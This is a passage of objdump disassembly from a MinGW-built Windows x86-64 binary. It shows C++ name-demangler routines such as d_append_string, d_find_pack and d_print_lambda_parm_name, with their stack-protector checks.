   14000236a:	31 c0                	xor    %eax,%eax
   14000236c:	80 fa 44             	cmp    $0x44,%dl
   14000236f:	74 1f                	je     140002390 <next_is_type_qual.isra.0+0x30>
   140002371:	c3                   	ret
   140002372:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002378:	48 ba fe f7 ff ff 7f 	movabs $0xffffff7ffffff7fe,%rdx
   14000237f:	ff ff ff 
   140002382:	48 0f a3 c2          	bt     %rax,%rdx
   140002386:	0f 93 c0             	setae  %al
   140002389:	0f b6 c0             	movzbl %al,%eax
   14000238c:	c3                   	ret
   14000238d:	0f 1f 00             	nopl   (%rax)
   140002390:	0f b6 51 01          	movzbl 0x1(%rcx),%edx
   140002394:	31 c0                	xor    %eax,%eax
   140002396:	83 ea 4f             	sub    $0x4f,%edx
   140002399:	80 fa 29             	cmp    $0x29,%dl
   14000239c:	77 d3                	ja     140002371 <next_is_type_qual.isra.0+0x11>
   14000239e:	48 b8 01 00 00 00 01 	movabs $0x30100000001,%rax
   1400023a5:	03 00 00 
   1400023a8:	48 0f a3 d0          	bt     %rdx,%rax
   1400023ac:	0f 92 c0             	setb   %al
   1400023af:	0f b6 c0             	movzbl %al,%eax
   1400023b2:	c3                   	ret
   1400023b3:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1400023ba:	00 00 00 00 
   1400023be:	66 90                	xchg   %ax,%ax

00000001400023c0 <d_append_char>:
   1400023c0:	56                   	push   %rsi
   1400023c1:	53                   	push   %rbx
   1400023c2:	48 83 ec 28          	sub    $0x28,%rsp
   1400023c6:	48 8b 81 00 01 00 00 	mov    0x100(%rcx),%rax
   1400023cd:	48 89 cb             	mov    %rcx,%rbx
   1400023d0:	89 d6                	mov    %edx,%esi
   1400023d2:	48 3d ff 00 00 00    	cmp    $0xff,%rax
   1400023d8:	74 26                	je     140002400 <d_append_char+0x40>
   1400023da:	48 8d 50 01          	lea    0x1(%rax),%rdx
   1400023de:	48 89 93 00 01 00 00 	mov    %rdx,0x100(%rbx)
   1400023e5:	40 88 34 03          	mov    %sil,(%rbx,%rax,1)
   1400023e9:	40 88 b3 08 01 00 00 	mov    %sil,0x108(%rbx)
   1400023f0:	48 83 c4 28          	add    $0x28,%rsp
   1400023f4:	5b                   	pop    %rbx
   1400023f5:	5e                   	pop    %rsi
   1400023f6:	c3                   	ret
   1400023f7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400023fe:	00 00 
   140002400:	ba ff 00 00 00       	mov    $0xff,%edx
   140002405:	c6 81 ff 00 00 00 00 	movb   $0x0,0xff(%rcx)
   14000240c:	4c 8b 81 18 01 00 00 	mov    0x118(%rcx),%r8
   140002413:	ff 91 10 01 00 00    	call   *0x110(%rcx)
   140002419:	83 83 40 01 00 00 01 	addl   $0x1,0x140(%rbx)
   140002420:	ba 01 00 00 00       	mov    $0x1,%edx
   140002425:	31 c0                	xor    %eax,%eax
   140002427:	eb b5                	jmp    1400023de <d_append_char+0x1e>
   140002429:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000140002430 <d_lookup_template_argument>:
   140002430:	48 8b 81 20 01 00 00 	mov    0x120(%rcx),%rax
   140002437:	48 85 c0             	test   %rax,%rax
   14000243a:	74 3c                	je     140002478 <d_lookup_template_argument+0x48>
   14000243c:	48 8b 40 08          	mov    0x8(%rax),%rax
   140002440:	8b 52 10             	mov    0x10(%rdx),%edx
   140002443:	48 8b 40 18          	mov    0x18(%rax),%rax
   140002447:	85 d2                	test   %edx,%edx
   140002449:	78 24                	js     14000246f <d_lookup_template_argument+0x3f>
   14000244b:	48 85 c0             	test   %rax,%rax
   14000244e:	75 18                	jne    140002468 <d_lookup_template_argument+0x38>
   140002450:	eb 1b                	jmp    14000246d <d_lookup_template_argument+0x3d>
   140002452:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002458:	85 d2                	test   %edx,%edx
   14000245a:	74 14                	je     140002470 <d_lookup_template_argument+0x40>
   14000245c:	48 8b 40 18          	mov    0x18(%rax),%rax
   140002460:	83 ea 01             	sub    $0x1,%edx
   140002463:	48 85 c0             	test   %rax,%rax
   140002466:	74 05                	je     14000246d <d_lookup_template_argument+0x3d>
   140002468:	83 38 30             	cmpl   $0x30,(%rax)
   14000246b:	74 eb                	je     140002458 <d_lookup_template_argument+0x28>
   14000246d:	31 c0                	xor    %eax,%eax
   14000246f:	c3                   	ret
   140002470:	48 8b 40 10          	mov    0x10(%rax),%rax
   140002474:	c3                   	ret
   140002475:	0f 1f 00             	nopl   (%rax)
   140002478:	c7 81 30 01 00 00 01 	movl   $0x1,0x130(%rcx)
   14000247f:	00 00 00 
   140002482:	31 c0                	xor    %eax,%eax
   140002484:	eb e9                	jmp    14000246f <d_lookup_template_argument+0x3f>
   140002486:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000248d:	00 00 00 

0000000140002490 <d_append_string>:
   140002490:	55                   	push   %rbp
   140002491:	57                   	push   %rdi
   140002492:	56                   	push   %rsi
   140002493:	53                   	push   %rbx
   140002494:	48 83 ec 28          	sub    $0x28,%rsp
   140002498:	48 89 ce             	mov    %rcx,%rsi
   14000249b:	48 89 d1             	mov    %rdx,%rcx
   14000249e:	48 89 d3             	mov    %rdx,%rbx
   1400024a1:	e8 7a 36 01 00       	call   140015b20 <strlen>
   1400024a6:	48 85 c0             	test   %rax,%rax
   1400024a9:	0f 84 91 00 00 00    	je     140002540 <d_append_string+0xb0>
   1400024af:	48 8b 96 00 01 00 00 	mov    0x100(%rsi),%rdx
   1400024b6:	48 8d 2c 03          	lea    (%rbx,%rax,1),%rbp
   1400024ba:	eb 26                	jmp    1400024e2 <d_append_string+0x52>
   1400024bc:	0f 1f 40 00          	nopl   0x0(%rax)
   1400024c0:	48 89 d1             	mov    %rdx,%rcx
   1400024c3:	48 8d 51 01          	lea    0x1(%rcx),%rdx
   1400024c7:	48 83 c3 01          	add    $0x1,%rbx
   1400024cb:	48 89 96 00 01 00 00 	mov    %rdx,0x100(%rsi)
   1400024d2:	40 88 3c 0e          	mov    %dil,(%rsi,%rcx,1)
   1400024d6:	40 88 be 08 01 00 00 	mov    %dil,0x108(%rsi)
   1400024dd:	48 39 eb             	cmp    %rbp,%rbx
   1400024e0:	74 5e                	je     140002540 <d_append_string+0xb0>
   1400024e2:	0f b6 3b             	movzbl (%rbx),%edi
   1400024e5:	48 81 fa ff 00 00 00 	cmp    $0xff,%rdx
   1400024ec:	75 d2                	jne    1400024c0 <d_append_string+0x30>
   1400024ee:	48 83 c3 01          	add    $0x1,%rbx
   1400024f2:	c6 86 ff 00 00 00 00 	movb   $0x0,0xff(%rsi)
   1400024f9:	ba ff 00 00 00       	mov    $0xff,%edx
   1400024fe:	48 89 f1             	mov    %rsi,%rcx
   140002501:	4c 8b 86 18 01 00 00 	mov    0x118(%rsi),%r8
   140002508:	ff 96 10 01 00 00    	call   *0x110(%rsi)
   14000250e:	83 86 40 01 00 00 01 	addl   $0x1,0x140(%rsi)
   140002515:	48 c7 86 00 01 00 00 	movq   $0x1,0x100(%rsi)
   14000251c:	01 00 00 00 
   140002520:	40 88 3e             	mov    %dil,(%rsi)
   140002523:	40 88 be 08 01 00 00 	mov    %dil,0x108(%rsi)
   14000252a:	48 39 dd             	cmp    %rbx,%rbp
   14000252d:	74 11                	je     140002540 <d_append_string+0xb0>
   14000252f:	0f b6 3b             	movzbl (%rbx),%edi
   140002532:	b9 01 00 00 00       	mov    $0x1,%ecx
   140002537:	eb 8a                	jmp    1400024c3 <d_append_string+0x33>
   140002539:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002540:	48 83 c4 28          	add    $0x28,%rsp
   140002544:	5b                   	pop    %rbx
   140002545:	5e                   	pop    %rsi
   140002546:	5f                   	pop    %rdi
   140002547:	5d                   	pop    %rbp
   140002548:	c3                   	ret
   140002549:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000140002550 <d_find_pack>:
   140002550:	56                   	push   %rsi
   140002551:	53                   	push   %rbx
   140002552:	48 83 ec 28          	sub    $0x28,%rsp
   140002556:	48 89 ce             	mov    %rcx,%rsi
   140002559:	48 89 d3             	mov    %rdx,%rbx
   14000255c:	48 85 d2             	test   %rdx,%rdx
   14000255f:	74 4f                	je     1400025b0 <d_find_pack+0x60>
   140002561:	8b 03                	mov    (%rbx),%eax
   140002563:	83 f8 18             	cmp    $0x18,%eax
   140002566:	77 18                	ja     140002580 <d_find_pack+0x30>
   140002568:	48 8d 15 e9 ee 34 00 	lea    0x34eee9(%rip),%rdx        # 140351458 <.rdata+0x58>
   14000256f:	48 63 04 82          	movslq (%rdx,%rax,4),%rax
   140002573:	48 01 d0             	add    %rdx,%rax
   140002576:	ff e0                	jmp    *%rax
   140002578:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000257f:	00 
   140002580:	83 e8 28             	sub    $0x28,%eax
   140002583:	83 f8 37             	cmp    $0x37,%eax
   140002586:	77 38                	ja     1400025c0 <d_find_pack+0x70>
   140002588:	48 ba 01 08 00 18 67 	movabs $0x80006718000801,%rdx
   14000258f:	00 80 00 
   140002592:	48 0f a3 c2          	bt     %rax,%rdx
   140002596:	72 18                	jb     1400025b0 <d_find_pack+0x60>
   140002598:	83 f8 0c             	cmp    $0xc,%eax
   14000259b:	75 23                	jne    1400025c0 <d_find_pack+0x70>
   14000259d:	48 8b 5b 18          	mov    0x18(%rbx),%rbx
   1400025a1:	48 85 db             	test   %rbx,%rbx
   1400025a4:	75 bb                	jne    140002561 <d_find_pack+0x11>
   1400025a6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   1400025ad:	00 00 00 
   1400025b0:	31 c0                	xor    %eax,%eax
   1400025b2:	48 83 c4 28          	add    $0x28,%rsp
   1400025b6:	5b                   	pop    %rbx
   1400025b7:	5e                   	pop    %rsi
   1400025b8:	c3                   	ret
   1400025b9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400025c0:	48 8b 53 10          	mov    0x10(%rbx),%rdx
   1400025c4:	48 89 f1             	mov    %rsi,%rcx
   1400025c7:	e8 84 ff ff ff       	call   140002550 <d_find_pack>
   1400025cc:	48 85 c0             	test   %rax,%rax
   1400025cf:	75 e1                	jne    1400025b2 <d_find_pack+0x62>
   1400025d1:	48 8b 5b 18          	mov    0x18(%rbx),%rbx
   1400025d5:	48 85 db             	test   %rbx,%rbx
   1400025d8:	75 87                	jne    140002561 <d_find_pack+0x11>
   1400025da:	eb d4                	jmp    1400025b0 <d_find_pack+0x60>
   1400025dc:	0f 1f 40 00          	nopl   0x0(%rax)
   1400025e0:	48 8b 86 20 01 00 00 	mov    0x120(%rsi),%rax
   1400025e7:	48 85 c0             	test   %rax,%rax
   1400025ea:	74 4c                	je     140002638 <d_find_pack+0xe8>
   1400025ec:	48 8b 40 08          	mov    0x8(%rax),%rax
   1400025f0:	8b 53 10             	mov    0x10(%rbx),%edx
   1400025f3:	48 8b 40 18          	mov    0x18(%rax),%rax
   1400025f7:	85 d2                	test   %edx,%edx
   1400025f9:	78 29                	js     140002624 <d_find_pack+0xd4>
   1400025fb:	48 85 c0             	test   %rax,%rax
   1400025fe:	75 18                	jne    140002618 <d_find_pack+0xc8>
   140002600:	eb ae                	jmp    1400025b0 <d_find_pack+0x60>
   140002602:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002608:	85 d2                	test   %edx,%edx
   14000260a:	74 14                	je     140002620 <d_find_pack+0xd0>
   14000260c:	48 8b 40 18          	mov    0x18(%rax),%rax
   140002610:	83 ea 01             	sub    $0x1,%edx
   140002613:	48 85 c0             	test   %rax,%rax
   140002616:	74 98                	je     1400025b0 <d_find_pack+0x60>
   140002618:	83 38 30             	cmpl   $0x30,(%rax)
   14000261b:	74 eb                	je     140002608 <d_find_pack+0xb8>
   14000261d:	eb 91                	jmp    1400025b0 <d_find_pack+0x60>
   14000261f:	90                   	nop
   140002620:	48 8b 40 10          	mov    0x10(%rax),%rax
   140002624:	48 85 c0             	test   %rax,%rax
   140002627:	74 87                	je     1400025b0 <d_find_pack+0x60>
   140002629:	83 38 30             	cmpl   $0x30,(%rax)
   14000262c:	75 82                	jne    1400025b0 <d_find_pack+0x60>
   14000262e:	48 83 c4 28          	add    $0x28,%rsp
   140002632:	5b                   	pop    %rbx
   140002633:	5e                   	pop    %rsi
   140002634:	c3                   	ret
   140002635:	0f 1f 00             	nopl   (%rax)
   140002638:	c7 86 30 01 00 00 01 	movl   $0x1,0x130(%rsi)
   14000263f:	00 00 00 
   140002642:	e9 69 ff ff ff       	jmp    1400025b0 <d_find_pack+0x60>
   140002647:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000264e:	00 00 

0000000140002650 <d_template_param>:
   140002650:	53                   	push   %rbx
   140002651:	48 83 ec 20          	sub    $0x20,%rsp
   140002655:	48 8b 41 18          	mov    0x18(%rcx),%rax
   140002659:	80 38 54             	cmpb   $0x54,(%rax)
   14000265c:	48 89 cb             	mov    %rcx,%rbx
   14000265f:	75 67                	jne    1400026c8 <d_template_param+0x78>
   140002661:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140002665:	48 89 51 18          	mov    %rdx,0x18(%rcx)
   140002669:	0f b6 40 01          	movzbl 0x1(%rax),%eax
   14000266d:	3c 5f                	cmp    $0x5f,%al
   14000266f:	74 5f                	je     1400026d0 <d_template_param+0x80>
   140002671:	3c 6e                	cmp    $0x6e,%al
   140002673:	74 53                	je     1400026c8 <d_template_param+0x78>
   140002675:	e8 e6 f7 ff ff       	call   140001e60 <d_number>
   14000267a:	83 c0 01             	add    $0x1,%eax
   14000267d:	89 c1                	mov    %eax,%ecx
   14000267f:	78 47                	js     1400026c8 <d_template_param+0x78>
   140002681:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   140002685:	80 3a 5f             	cmpb   $0x5f,(%rdx)
   140002688:	75 3e                	jne    1400026c8 <d_template_param+0x78>
   14000268a:	48 83 c2 01          	add    $0x1,%rdx
   14000268e:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   140002692:	8b 53 28             	mov    0x28(%rbx),%edx
   140002695:	3b 53 2c             	cmp    0x2c(%rbx),%edx
   140002698:	7d 2e                	jge    1400026c8 <d_template_param+0x78>
   14000269a:	48 63 c2             	movslq %edx,%rax
   14000269d:	83 c2 01             	add    $0x1,%edx
   1400026a0:	48 c1 e0 05          	shl    $0x5,%rax
   1400026a4:	48 03 43 20          	add    0x20(%rbx),%rax
   1400026a8:	48 c7 40 04 00 00 00 	movq   $0x0,0x4(%rax)
   1400026af:	00 
   1400026b0:	89 53 28             	mov    %edx,0x28(%rbx)
   1400026b3:	c7 00 05 00 00 00    	movl   $0x5,(%rax)
   1400026b9:	89 48 10             	mov    %ecx,0x10(%rax)
   1400026bc:	48 83 c4 20          	add    $0x20,%rsp
   1400026c0:	5b                   	pop    %rbx
   1400026c1:	c3                   	ret
   1400026c2:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400026c8:	31 c0                	xor    %eax,%eax
   1400026ca:	48 83 c4 20          	add    $0x20,%rsp
   1400026ce:	5b                   	pop    %rbx
   1400026cf:	c3                   	ret
   1400026d0:	31 c9                	xor    %ecx,%ecx
   1400026d2:	eb b6                	jmp    14000268a <d_template_param+0x3a>
   1400026d4:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1400026db:	00 00 00 00 
   1400026df:	90                   	nop

00000001400026e0 <d_append_num>:
   1400026e0:	41 54                	push   %r12
   1400026e2:	55                   	push   %rbp
   1400026e3:	57                   	push   %rdi
   1400026e4:	56                   	push   %rsi
   1400026e5:	53                   	push   %rbx
   1400026e6:	48 83 ec 50          	sub    $0x50,%rsp
   1400026ea:	4c 8b 25 7f 15 35 00 	mov    0x35157f(%rip),%r12        # 140353c70 <.refptr.__stack_chk_guard>
   1400026f1:	4c 8d 05 c4 ed 34 00 	lea    0x34edc4(%rip),%r8        # 1403514bc <.rdata+0xbc>
   1400026f8:	49 8b 34 24          	mov    (%r12),%rsi
   1400026fc:	48 89 74 24 48       	mov    %rsi,0x48(%rsp)
   140002701:	48 8d 74 24 20       	lea    0x20(%rsp),%rsi
   140002706:	48 89 cb             	mov    %rcx,%rbx
   140002709:	41 89 d1             	mov    %edx,%r9d
   14000270c:	ba 19 00 00 00       	mov    $0x19,%edx
   140002711:	48 89 f1             	mov    %rsi,%rcx
   140002714:	e8 57 d6 00 00       	call   14000fd70 <__mingw_snprintf>
   140002719:	85 c0                	test   %eax,%eax
   14000271b:	78 10                	js     14000272d <d_append_num+0x4d>
   14000271d:	48 98                	cltq
   14000271f:	48 83 c0 01          	add    $0x1,%rax
   140002723:	48 83 f8 19          	cmp    $0x19,%rax
   140002727:	0f 87 e9 00 00 00    	ja     140002816 <d_append_num+0x136>
   14000272d:	48 89 f1             	mov    %rsi,%rcx
   140002730:	e8 eb 33 01 00       	call   140015b20 <strlen>
   140002735:	48 85 c0             	test   %rax,%rax
   140002738:	0f 84 c2 00 00 00    	je     140002800 <d_append_num+0x120>
   14000273e:	48 8b 93 00 01 00 00 	mov    0x100(%rbx),%rdx
   140002745:	48 8d 2c 06          	lea    (%rsi,%rax,1),%rbp
   140002749:	eb 57                	jmp    1400027a2 <d_append_num+0xc2>
   14000274b:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140002752:	00 00 00 00 
   140002756:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   14000275d:	00 00 00 00 
   140002761:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140002768:	00 00 00 00 
   14000276c:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140002773:	00 00 00 00 
   140002777:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000277e:	00 00 
   140002780:	48 89 d1             	mov    %rdx,%rcx
   140002783:	48 8d 51 01          	lea    0x1(%rcx),%rdx
   140002787:	48 83 c6 01          	add    $0x1,%rsi
   14000278b:	48 89 93 00 01 00 00 	mov    %rdx,0x100(%rbx)
   140002792:	40 88 3c 0b          	mov    %dil,(%rbx,%rcx,1)
   140002796:	40 88 bb 08 01 00 00 	mov    %dil,0x108(%rbx)
   14000279d:	48 39 ee             	cmp    %rbp,%rsi
   1400027a0:	74 5e                	je     140002800 <d_append_num+0x120>
   1400027a2:	0f b6 3e             	movzbl (%rsi),%edi
   1400027a5:	48 81 fa ff 00 00 00 	cmp    $0xff,%rdx
   1400027ac:	75 d2                	jne    140002780 <d_append_num+0xa0>
   1400027ae:	48 83 c6 01          	add    $0x1,%rsi
   1400027b2:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%rbx)
   1400027b9:	ba ff 00 00 00       	mov    $0xff,%edx
   1400027be:	48 89 d9             	mov    %rbx,%rcx
   1400027c1:	4c 8b 83 18 01 00 00 	mov    0x118(%rbx),%r8
   1400027c8:	ff 93 10 01 00 00    	call   *0x110(%rbx)
   1400027ce:	83 83 40 01 00 00 01 	addl   $0x1,0x140(%rbx)
   1400027d5:	48 c7 83 00 01 00 00 	movq   $0x1,0x100(%rbx)
   1400027dc:	01 00 00 00 
   1400027e0:	40 88 3b             	mov    %dil,(%rbx)
   1400027e3:	40 88 bb 08 01 00 00 	mov    %dil,0x108(%rbx)
   1400027ea:	48 39 f5             	cmp    %rsi,%rbp
   1400027ed:	74 11                	je     140002800 <d_append_num+0x120>
   1400027ef:	0f b6 3e             	movzbl (%rsi),%edi
   1400027f2:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400027f7:	eb 8a                	jmp    140002783 <d_append_num+0xa3>
   1400027f9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002800:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   140002805:	49 2b 04 24          	sub    (%r12),%rax
   140002809:	75 10                	jne    14000281b <d_append_num+0x13b>
   14000280b:	48 83 c4 50          	add    $0x50,%rsp
   14000280f:	5b                   	pop    %rbx
   140002810:	5e                   	pop    %rsi
   140002811:	5f                   	pop    %rdi
   140002812:	5d                   	pop    %rbp
   140002813:	41 5c                	pop    %r12
   140002815:	c3                   	ret
   140002816:	e8 b5 d4 00 00       	call   14000fcd0 <__chk_fail>
   14000281b:	e8 00 d5 00 00       	call   14000fd20 <__stack_chk_fail>
   140002820:	90                   	nop
   140002821:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140002828:	00 00 00 00 
   14000282c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000140002830 <d_print_lambda_parm_name>:
   140002830:	41 55                	push   %r13
   140002832:	41 54                	push   %r12
   140002834:	55                   	push   %rbp
   140002835:	57                   	push   %rdi
   140002836:	56                   	push   %rsi
   140002837:	53                   	push   %rbx
   140002838:	48 83 ec 58          	sub    $0x58,%rsp
   14000283c:	48 8b 2d 2d 14 35 00 	mov    0x35142d(%rip),%rbp        # 140353c70 <.refptr.__stack_chk_guard>
   140002843:	48 8b 45 00          	mov    0x0(%rbp),%rax
   140002847:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   14000284c:	31 c0                	xor    %eax,%eax
   14000284e:	48 89 cb             	mov    %rcx,%rbx
   140002851:	45 89 c4             	mov    %r8d,%r12d
   140002854:	83 fa 5b             	cmp    $0x5b,%edx
   140002857:	0f 84 13 02 00 00    	je     140002a70 <d_print_lambda_parm_name+0x240>
   14000285d:	83 fa 5c             	cmp    $0x5c,%edx
   140002860:	0f 84 da 01 00 00    	je     140002a40 <d_print_lambda_parm_name+0x210>
   140002866:	83 fa 5a             	cmp    $0x5a,%edx
   140002869:	0f 84 19 01 00 00    	je     140002988 <d_print_lambda_parm_name+0x158>
   14000286f:	c7 81 30 01 00 00 01 	movl   $0x1,0x130(%rcx)
   140002876:	00 00 00 
   140002879:	48 8d 74 24 20       	lea    0x20(%rsp),%rsi
   14000287e:	45 89 e1             	mov    %r12d,%r9d
   140002881:	ba 19 00 00 00       	mov    $0x19,%edx
   140002886:	4c 8d 05 2f ec 34 00 	lea    0x34ec2f(%rip),%r8        # 1403514bc <.rdata+0xbc>
   14000288d:	48 89 f1             	mov    %rsi,%rcx
   140002890:	e8 db d4 00 00       	call   14000fd70 <__mingw_snprintf>
   140002895:	85 c0                	test   %eax,%eax
   140002897:	78 10                	js     1400028a9 <d_print_lambda_parm_name+0x79>
   140002899:	48 98                	cltq
   14000289b:	48 83 c0 01          	add    $0x1,%rax
   14000289f:	48 83 f8 19          	cmp    $0x19,%rax
   1400028a3:	0f 87 df 01 00 00    	ja     140002a88 <d_print_lambda_parm_name+0x258>
   1400028a9:	48 89 f1             	mov    %rsi,%rcx
   1400028ac:	e8 6f 32 01 00       	call   140015b20 <strlen>
   1400028b1:	48 85 c0             	test   %rax,%rax
   1400028b4:	0f 84 9e 01 00 00    	je     140002a58 <d_print_lambda_parm_name+0x228>
   1400028ba:	48 8b 93 00 01 00 00 	mov    0x100(%rbx),%rdx
   1400028c1:	4c 8d 24 06          	lea    (%rsi,%rax,1),%r12
   1400028c5:	eb 5f                	jmp    140002926 <d_print_lambda_parm_name+0xf6>
   1400028c7:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1400028ce:	00 00 00 00 
   1400028d2:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1400028d9:	00 00 00 00 
   1400028dd:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1400028e4:	00 00 00 00 
   1400028e8:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1400028ef:	00 00 00 00 
   1400028f3:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1400028fa:	00 00 00 00 
   1400028fe:	66 90                	xchg   %ax,%ax
   140002900:	48 89 d1             	mov    %rdx,%rcx
   140002903:	48 8d 51 01          	lea    0x1(%rcx),%rdx
   140002907:	48 83 c6 01          	add    $0x1,%rsi
   14000290b:	48 89 93 00 01 00 00 	mov    %rdx,0x100(%rbx)
   140002912:	40 88 3c 0b          	mov    %dil,(%rbx,%rcx,1)
   140002916:	40 88 bb 08 01 00 00 	mov    %dil,0x108(%rbx)
   14000291d:	49 39 f4             	cmp    %rsi,%r12
   140002920:	0f 84 32 01 00 00    	je     140002a58 <d_print_lambda_parm_name+0x228>
   140002926:	0f b6 3e             	movzbl (%rsi),%edi
   140002929:	48 81 fa ff 00 00 00 	cmp    $0xff,%rdx
   140002930:	75 ce                	jne    140002900 <d_print_lambda_parm_name+0xd0>
   140002932:	48 83 c6 01          	add    $0x1,%rsi
   140002936:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%rbx)
   14000293d:	ba ff 00 00 00       	mov    $0xff,%edx
   140002942:	48 89 d9             	mov    %rbx,%rcx
   140002945:	4c 8b 83 18 01 00 00 	mov    0x118(%rbx),%r8
   14000294c:	ff 93 10 01 00 00    	call   *0x110(%rbx)
   140002952:	83 83 40 01 00 00 01 	addl   $0x1,0x140(%rbx)
   140002959:	48 c7 83 00 01 00 00 	movq   $0x1,0x100(%rbx)
   140002960:	01 00 00 00 
   140002964:	40 88 3b             	mov    %dil,(%rbx)
   140002967:	40 88 bb 08 01 00 00 	mov    %dil,0x108(%rbx)
   14000296e:	49 39 f4             	cmp    %rsi,%r12
   140002971:	0f 84 e1 00 00 00    	je     140002a58 <d_print_lambda_parm_name+0x228>
   140002977:	0f b6 3e             	movzbl (%rsi),%edi
   14000297a:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000297f:	eb 82                	jmp    140002903 <d_print_lambda_parm_name+0xd3>
   140002981:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002988:	41 bd 02 00 00 00    	mov    $0x2,%r13d
   14000298e:	48 8d 35 2e eb 34 00 	lea    0x34eb2e(%rip),%rsi        # 1403514c3 <.rdata+0xc3>
   140002995:	48 8b 83 00 01 00 00 	mov    0x100(%rbx),%rax
   14000299c:	49 01 f5             	add    %rsi,%r13
   14000299f:	eb 45                	jmp    1400029e6 <d_print_lambda_parm_name+0x1b6>
   1400029a1:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1400029a8:	00 00 00 00 
   1400029ac:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1400029b3:	00 00 00 00 
   1400029b7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400029be:	00 00 
   1400029c0:	48 89 c2             	mov    %rax,%rdx
   1400029c3:	48 8d 42 01          	lea    0x1(%rdx),%rax
   1400029c7:	48 83 c6 01          	add    $0x1,%rsi
   1400029cb:	48 89 83 00 01 00 00 	mov    %rax,0x100(%rbx)
   1400029d2:	40 88 3c 13          	mov    %dil,(%rbx,%rdx,1)
   1400029d6:	40 88 bb 08 01 00 00 	mov    %dil,0x108(%rbx)
   1400029dd:	4c 39 ee             	cmp    %r13,%rsi
   1400029e0:	0f 84 93 fe ff ff    	je     140002879 <d_print_lambda_parm_name+0x49>
   1400029e6:	0f b6 3e             	movzbl (%rsi),%edi
   1400029e9:	48 3d ff 00 00 00    	cmp    $0xff,%rax
   1400029ef:	75 cf                	jne    1400029c0 <d_print_lambda_parm_name+0x190>
   1400029f1:	48 83 c6 01          	add    $0x1,%rsi
   1400029f5:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%rbx)
   1400029fc:	ba ff 00 00 00       	mov    $0xff,%edx
   140002a01:	48 89 d9             	mov    %rbx,%rcx
   140002a04:	4c 8b 83 18 01 00 00 	mov    0x118(%rbx),%r8
   140002a0b:	ff 93 10 01 00 00    	call   *0x110(%rbx)
   140002a11:	83 83 40 01 00 00 01 	addl   $0x1,0x140(%rbx)
   140002a18:	48 c7 83 00 01 00 00 	movq   $0x1,0x100(%rbx)
   140002a1f:	01 00 00 00 
   140002a23:	40 88 3b             	mov    %dil,(%rbx)
   140002a26:	40 88 bb 08 01 00 00 	mov    %dil,0x108(%rbx)
   140002a2d:	4c 39 ee             	cmp    %r13,%rsi
   140002a30:	0f 84 43 fe ff ff    	je     140002879 <d_print_lambda_parm_name+0x49>
   140002a36:	0f b6 3e             	movzbl (%rsi),%edi
   140002a39:	ba 01 00 00 00       	mov    $0x1,%edx
   140002a3e:	eb 83                	jmp    1400029c3 <d_print_lambda_parm_name+0x193>
   140002a40:	41 bd 03 00 00 00    	mov    $0x3,%r13d
   140002a46:	48 8d 35 72 ea 34 00 	lea    0x34ea72(%rip),%rsi        # 1403514bf <.rdata+0xbf>
   140002a4d:	e9 43 ff ff ff       	jmp    140002995 <d_print_lambda_parm_name+0x165>
   140002a52:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002a58:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   140002a5d:	48 2b 45 00          	sub    0x0(%rbp),%rax
   140002a61:	75 2a                	jne    140002a8d <d_print_lambda_parm_name+0x25d>
   140002a63:	48 83 c4 58          	add    $0x58,%rsp
   140002a67:	5b                   	pop    %rbx
   140002a68:	5e                   	pop    %rsi
   140002a69:	5f                   	pop    %rdi
   140002a6a:	5d                   	pop    %rbp
   140002a6b:	41 5c                	pop    %r12
   140002a6d:	41 5d                	pop    %r13
   140002a6f:	c3                   	ret
   140002a70:	41 bd 02 00 00 00    	mov    $0x2,%r13d
   140002a76:	48 8d 35 49 ea 34 00 	lea    0x34ea49(%rip),%rsi        # 1403514c6 <.rdata+0xc6>
